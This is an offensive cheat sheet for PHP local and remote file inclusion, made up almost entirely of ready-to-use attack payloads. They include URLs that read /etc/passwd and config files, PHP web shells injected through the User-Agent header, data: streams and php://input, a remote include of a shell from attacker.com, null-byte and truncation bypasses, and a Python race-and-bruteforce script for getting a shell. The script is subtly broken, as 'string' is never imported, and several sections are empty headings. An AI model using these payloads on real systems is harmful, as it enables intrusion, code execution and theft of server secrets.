# Local File Inclusion

## 1) Direct Local Include
```
http://site.com/lfi.php?page=/etc/passwd
```

## 2) php://filter
```
http://www.site.com/lfi.php?page=php://filter/resource=config.php

http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php
```

## 3) /proc/self/environ
Request's user agent can be found there

```
GET /lfi.php?page=/proc/self/environ&cmd=id HTTP/1.1
Host: www.site.com
User-Agent: <?php echo shell_exec($_GET['cmd']);?>
```

## 4) Including images
If image.jpg contains php code it will be interpreted.

```
http://www.site.com/lfi.php?page=upload/image.jpg
```

## 5) Zip and Phar wrappers
File must be zip archive with any extension

```
http://www.site.com/lfi.php?page=zip://image.zip#shell.php

http://www.site.com/lfi.php?page=phar://image.phar#shell.php
```

## 6) File Upload

It requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.

1. Upload a file and trigger a self-inclusion
2. Repeat step 1 until successful attack
3. Bruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}
4. Shell

We have 62**6 possible values -> 56800235584 filenames for temporary uploaded files
Birthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

It is possible to send 20 files in one request that will be accepted by the server.

## 7) Session Files

## 8) PHPInfo Script

## 9) Temporary Files - Windows

## 10) Logs

# Remote File Inclusion
Works when allow_url_include in php.ini is set to TRUE

## 1) Direct Remote Include
Including php file in text format directly
```
http://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt
```

## 2) Data:text/plain
Including php code through data stream
```
http://www.site.com/lfi.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=
```

## 3) php://input

```
POST /lfi.php?page=php://input&cmd=cd HTTP/1.1
Host: www.site.com
Content-Lenth: 39

<?php echo shell_exec($_GET['cmd']);?>

```

# Fighting with extensions

## 1) Null Bytes
Add null byte that will terminate string

```
http://www.site.com/lfi.php?page=/etc/passwd%00

http://www.site.com/lfi.php?page=/etc/passwd%2500
```

## 2) Truncation

Cut extension by creating long string
```
http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd
```

```
http://www.site.com/lfi.php?page=/etc/passwd..............................
```

```
http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
```
